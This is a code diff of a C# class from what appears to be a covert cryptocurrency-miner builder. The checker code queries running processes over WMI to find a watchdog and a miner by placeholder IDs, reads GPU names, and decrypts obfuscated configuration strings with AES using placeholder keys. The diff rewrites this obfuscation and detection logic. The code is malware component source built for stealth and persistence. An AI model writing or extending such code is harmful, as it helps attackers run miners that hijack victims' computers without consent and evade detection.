@@ -29,7 +29,7 @@ public partial class _rChecker_
 
             var _rconnection_ = new ConnectionOptions();
             _rconnection_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rscope_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rconnection_);
+            var _rscope_ = new ManagementScope("#WMISCOPE", _rconnection_);
             _rscope_.Connect();
 
             var _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("Select CommandLine from Win32_Process")).Get();
@@ -37,7 +37,7 @@ public partial class _rChecker_
             bool _rwdrunning_ = false;
             foreach (ManagementObject _rmemObj_ in _rsearcher_)
             {
-                if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && _rmemObj_["CommandLine"].ToString().Contains(_rGetString_("#WATCHDOGID")))
+                if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && _rmemObj_["CommandLine"].ToString().Contains("#WATCHDOGID"))
                 {
                     _rwdrunning_ = true;
                     break;
@@ -52,7 +52,7 @@ public partial class _rChecker_
             _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("Select CommandLine from Win32_Process")).Get();
             foreach (ManagementObject _rmemObj_ in _rsearcher_)
             {
-                if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && _rmemObj_["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
+                if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && _rmemObj_["CommandLine"].ToString().Contains("#MINERID"))
                 {
                     try
                     {
@@ -72,7 +72,7 @@ public partial class _rChecker_
 
             string _rgpu_ = "";
             Console.WriteLine("GPUs:");
-            _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery(_rGetString_("#GPUQUERY"))).Get();
+            _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("#GPUQUERY")).Get();
             foreach (ManagementObject _rmemObj_ in _rsearcher_)
             {
                 _rgpu_ += " " + _rmemObj_["Name"];
@@ -90,24 +90,23 @@ public partial class _rChecker_
 
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+        return Encoding.Unicode.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
 
-    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
+    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
     {
-        var _rarg3_ = Encoding.ASCII.GetBytes("#IV");
-        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
-        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
-        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), _rarg3_) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), _rarg3_);
-        using (var _rarg7_ = new MemoryStream())
+        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
+        using (Aes _raesAlg_ = Aes.Create())
         {
-            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
+            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
             {
-                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
-                _rarg8_.Close();
+                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
+                {
+                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
+                    _rcsDecrypt_.Close();
+                }
+                return _rmsDecrypt_.ToArray();
             }
-
-            return _rarg7_.ToArray();
         }
     }
 
@@ -118,7 +117,7 @@ public partial class _rChecker_
             var _rinput_ = Convert.FromBase64String(_rplainText_);
             using (var _rmStream_ = new MemoryStream())
             {
-                using (var _rcStream_ = new CryptoStream(_rmStream_, new RijndaelManaged() { KeySize = 256, BlockSize = 128, Mode = CipherMode.CBC, Padding = PaddingMode.Zeros }.CreateDecryptor(Encoding.ASCII.GetBytes(_rGetString_("#UNAMKEY")), Encoding.ASCII.GetBytes(_rGetString_("#UNAMIV"))), CryptoStreamMode.Write))
+                using (var _rcStream_ = new CryptoStream(_rmStream_, new RijndaelManaged() { KeySize = 256, BlockSize = 128, Mode = CipherMode.CBC, Padding = PaddingMode.Zeros }.CreateDecryptor(Encoding.ASCII.GetBytes("#UNAMKEY"), Encoding.ASCII.GetBytes("#UNAMIV")), CryptoStreamMode.Write))
                 {
                     _rcStream_.Write(_rinput_, 0, _rinput_.Length);
                     _rcStream_.FlushFinalBlock();
